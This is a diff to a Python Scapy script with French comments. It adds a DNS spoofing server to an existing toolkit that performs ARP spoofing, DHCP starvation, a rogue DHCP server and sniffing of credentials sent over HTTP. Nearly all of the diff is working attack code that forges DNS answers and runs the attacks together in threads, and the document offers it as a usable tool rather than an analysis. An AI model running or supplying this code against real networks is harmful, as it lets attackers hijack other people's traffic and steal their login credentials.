@@ -1,11 +1,12 @@
 #!/usr/bin/env python3
 
-#!/usr/bin/env python3
-
-import time
+import argparse
+import json
+import socket
 from threading import Thread
+import time
+
 from scapy.all import *
-from scapy.layers.dhcp import BOOTP, DHCP
 from scapy.layers.dns import DNSRR, DNS
 from scapy.layers.inet import IP, UDP
 from scapy.layers.l2 import Ether, ARP
@@ -137,6 +138,51 @@ def credentialsSniffing(packet):
         print(f"[+] Captured credentials from {url}: {credentials}")
 
 
+# Classe DNS Spoofing
+class DNSServer:
+    def __init__(self, location=None):
+        self.__dictDomains = {}
+        self.setDomainsList(location)
+        self.__ip = get_if_addr(conf.iface)
+
+    def setDomainsList(self, location):
+        if location is None:
+            location = "domains.txt"
+        with open(location, "r") as f:
+            self.__dictDomains = json.load(f)
+        self.__dictDomains.pop("domain", None)
+
+    def getDNSIP(self):
+        return self.__ip
+
+    def generatePacket(self, packet, host, resolvedIP, ip, udp):
+        dns_response = (
+            IP(src=ip.dst, dst=ip.src) /
+            UDP(sport=udp.dport, dport=udp.sport) /
+            DNS(id=packet[DNS].id, qr=1, aa=0, rcode=0, qd=packet.qd,
+                an=DNSRR(rrname=host + ".", ttl=330, type="A", rclass="IN", rdata=resolvedIP))
+        )
+        return dns_response
+
+    def listener(self, packet):
+        ip = packet.getlayer(IP)
+        udp = packet.getlayer(UDP)
+
+        if hasattr(packet, 'qd') and packet.qd is not None:
+            host = packet.qd.qname[:-1].decode("utf-8")
+            if host in self.__dictDomains:
+                resolvedIP = self.__dictDomains[host]
+                print(f"[*] Spoofing DNS request. {host} -> {resolvedIP}")
+            else:
+                try:
+                    resolvedIP = socket.gethostbyname(host)
+                except:
+                    resolvedIP = None
+
+            if resolvedIP is not None:
+                send(self.generatePacket(packet, host, resolvedIP, ip, udp))
+
+
 # Détection automatique de la passerelle
 gateway_ip = conf.route.route("0.0.0.0")[2]
 target_ip = "192.168.1.10"  # Exemple d'adresse IP cible
@@ -146,6 +192,7 @@ iprange = "192.168.1.100-192.168.1.150"
 arp_spoofing = ARPSpoofing(target_ip, gateway_ip)
 dhcp_starvation = DHCPStarvation()
 dhcp_rogue_server = DHCPRogueServer()
+dns_server = DNSServer("domains.txt")
 
 # Lancer ARP Spoofing et DHCP Starvation en parallèle
 arp_thread = Thread(target=arp_spoofing.spoof)
@@ -160,18 +207,13 @@ arp_thread.join()
 dhcp_starvation_thread.join()
 
 # Lancer le DHCP Rogue Server
-dhcp_rogue_server.start(iprange)
+dhcp_rogue_thread = Thread(target=dhcp_rogue_server.start, args=(iprange,))
+dhcp_rogue_thread.start()
+
+# Lancer le serveur DNS Spoofing
+dns_thread = Thread(target=lambda: sniff(filter="udp port 53", prn=dns_server.listener))
+dns_thread.start()
 
 # Sniff HTTP (en continu)
 print("[*] Lancement de HTTP sniffing en continu...")
 sniff(filter="tcp port 80", prn=credentialsSniffing)
-
-
-###########################################################################
-###Ton propre Script d'ARP Scan                                         ###
-###Ton proper script d'ARP spoof                                        ###
-###https://github.com/juanga333/DHCP-Server/blob/main/starvation.py     ###
-###https://github.com/juanga333/DHCP-Server/blob/main/dhcpserver.py     ###
-###https://github.com/juanga333/DNS-Server/blob/main/dnsserver.py       ###
-###https://github.com/juanga333/Simply-HTTP-sniffer/blob/main/sniffer.py###
-###########################################################################
